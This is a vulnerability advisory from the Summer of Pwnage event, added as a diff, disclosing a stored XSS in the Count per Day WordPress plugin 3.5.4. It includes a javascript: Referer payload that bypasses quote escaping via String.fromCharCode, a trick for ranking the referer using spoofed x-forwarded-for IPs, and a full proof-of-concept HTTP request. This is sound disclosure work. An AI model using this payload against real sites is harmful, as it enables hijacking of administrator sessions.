@@ -1,0 +1,50 @@
+Stored Cross-Site Scripting vulnerability in Count per Day WordPress Plugin
+
+Abstract
+
+A Cross-Site Scripting vulnerability was found in the Count per Day WordPress Plugin. This issue can be exploited by an unauthenticated attacker and allows an attacker to perform a wide variety of actions, such as stealing users' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a victim into opening a malicious website/link.
+
+Contact
+
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+
+OVE-20160717-0001
+
+Tested versions
+This issue was successfully tested on Count per Day WordPress Plugin version 3.5.4.
+
+Fix
+This issue is resolved in Count per Day version 3.5.5.
+
+Introduction
+
+The Count per Day WordPress Plugin shows reads and visitors per page, visitors today, yesterday, last week, last months and other statistics. A Cross-Site Scripting vulnerability was found in the Count per Day WordPress Plugin. This issue can be exploited by an unauthenticated attacker and allows an attacker to perform a wide variety of actions, such as stealing users' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a victim into opening a malicious website/link.
+
+Details
+
+When manipulating the referer header by putting in javascript: it will be rendered on the admin page within the referers list as a a href attribute. When admin (or above author level) clicks on it the XSS gets executed.
+
+Tags get stripped so it's not possible to execute the XSS directly on load. Single and double quotes are escaped, but can be worked around. Example:
+
+Referer: javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
+
+
+The referer list shows the top 20. But its easy to get your attack referer in the top by just looping with unique x-forwarded-for ip's. By default referers are stored (but can be turned off in the settings of the plugin). Up to 150 chars of the referer are stored (can be changed to 500 max).
+
+Proof of concept
+
+GET / HTTP/1.1
+Host: <target>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,nl;q=0.6
+x-forwarded-for: 1.1.1.5
+Referer: javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
+Connection: close
